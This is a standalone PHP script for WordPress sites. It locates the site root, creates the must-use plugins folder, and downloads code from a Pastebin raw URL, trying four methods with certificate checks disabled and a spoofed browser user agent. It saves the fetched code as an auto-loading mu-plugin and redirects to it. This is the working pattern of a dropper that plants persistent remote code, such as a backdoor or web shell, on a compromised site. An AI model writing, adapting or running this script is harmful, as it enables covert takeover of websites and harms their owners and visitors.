<?php
// Find WordPress root directory
$current_dir = __DIR__;
$wp_root = '';

// Go up directories until we find wp-config.php
for ($i = 0; $i < 10; $i++) {
    if (file_exists($current_dir . '/wp-config.php')) {
        $wp_root = $current_dir;
        break;
    }
    $current_dir = dirname($current_dir);
}

if (empty($wp_root)) {
    die("Could not find WordPress root directory\n");
}

// Create mu-plugins folder if it doesn't exist
$mu_plugins_dir = $wp_root . '/wp-content/mu-plugins';

if (!file_exists($mu_plugins_dir)) {
    mkdir($mu_plugins_dir, 0755, true);
    echo "Created mu-plugins directory\n";
} else {
    echo "mu-plugins directory already exists\n";
}

// Download code from Pastebin using multiple methods
$pastebin_url = 'https://pastebin.com/raw/Pvvze77H';
$code = false;

// Method 1: Try cURL
if (function_exists('curl_init')) {
    echo "Trying cURL...\n";
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $pastebin_url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        CURLOPT_TIMEOUT => 30,
        CURLOPT_CONNECTTIMEOUT => 10,
    ]);
    
    $code = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);
    
    if ($code === false) {
        echo "cURL Error: $curl_error\n";
    } elseif ($http_code != 200) {
        echo "HTTP Error: $http_code\n";
        $code = false;
    } else {
        echo "cURL successful!\n";
    }
}

// Method 2: Try file_get_contents with context
if ($code === false && ini_get('allow_url_fopen')) {
    echo "Trying file_get_contents...\n";
    
    $context = stream_context_create([
        'http' => [
            'timeout' => 30,
            'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'follow_location' => true,
            'ignore_errors' => true,
        ],
        'ssl' => [
            'verify_peer' => false,
            'verify_peer_name' => false,
        ],
    ]);
    
    $code = @file_get_contents($pastebin_url, false, $context);
    
    if ($code !== false) {
        echo "file_get_contents successful!\n";
    }
}

// Method 3: Try fsockopen
if ($code === false && function_exists('fsockopen')) {
    echo "Trying fsockopen...\n";
    
    $parts = parse_url($pastebin_url);
    $host = $parts['host'];
    $path = $parts['path'] . (isset($parts['query']) ? '?' . $parts['query'] : '');
    
    $fp = @fsockopen('ssl://' . $host, 443, $errno, $errstr, 30);
    
    if ($fp) {
        $out = "GET $path HTTP/1.1\r\n";
        $out .= "Host: $host\r\n";
        $out .= "User-Agent: Mozilla/5.0\r\n";
        $out .= "Connection: Close\r\n\r\n";
        
        fwrite($fp, $out);
        
        $response = '';
        while (!feof($fp)) {
            $response .= fgets($fp, 128);
        }
        fclose($fp);
        
        // Remove headers
        $parts = explode("\r\n\r\n", $response, 2);
        if (count($parts) > 1) {
            $code = $parts[1];
            echo "fsockopen successful!\n";
        }
    } else {
        echo "fsockopen Error: $errstr ($errno)\n";
    }
}

// Method 4: Try WP HTTP API (if WordPress is loaded)
if ($code === false) {
    echo "Trying WordPress HTTP API...\n";
    
    // Try to load WordPress
    if (file_exists($wp_root . '/wp-load.php')) {
        require_once($wp_root . '/wp-load.php');
        
        $response = wp_remote_get($pastebin_url, [
            'timeout' => 30,
            'sslverify' => false,
            'user-agent' => 'Mozilla/5.0',
        ]);
        
        if (!is_wp_error($response) && wp_remote_retrieve_response_code($response) === 200) {
            $code = wp_remote_retrieve_body($response);
            echo "WordPress HTTP API successful!\n";
        } else {
            $error_message = is_wp_error($response) ? $response->get_error_message() : 'Unknown error';
            echo "WordPress HTTP API Error: $error_message\n";
        }
    }
}

// Check if download failed
if ($code === false || empty($code)) {
    die("Failed to download from Pastebin using all methods\n");
}

echo "Downloaded " . strlen($code) . " bytes\n";

// Save to mu-plugins folder
$filename = 'pastebin-code.php';
$filepath = $mu_plugins_dir . '/' . $filename;
$result = file_put_contents($filepath, $code);

if ($result !== false) {
    echo "Successfully saved to: $filepath\n";
    
    // Set permissions
    chmod($filepath, 0644);
    
    // Redirect to the saved file URL
    $site_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
    $redirect_url = $site_url . '/wp-content/mu-plugins/' . $filename;
    
    echo "Redirecting to: $redirect_url\n";
    header("Location: " . $redirect_url);
    exit();
} else {
    echo "Failed to save file. Check permissions on: $mu_plugins_dir\n";
}
?>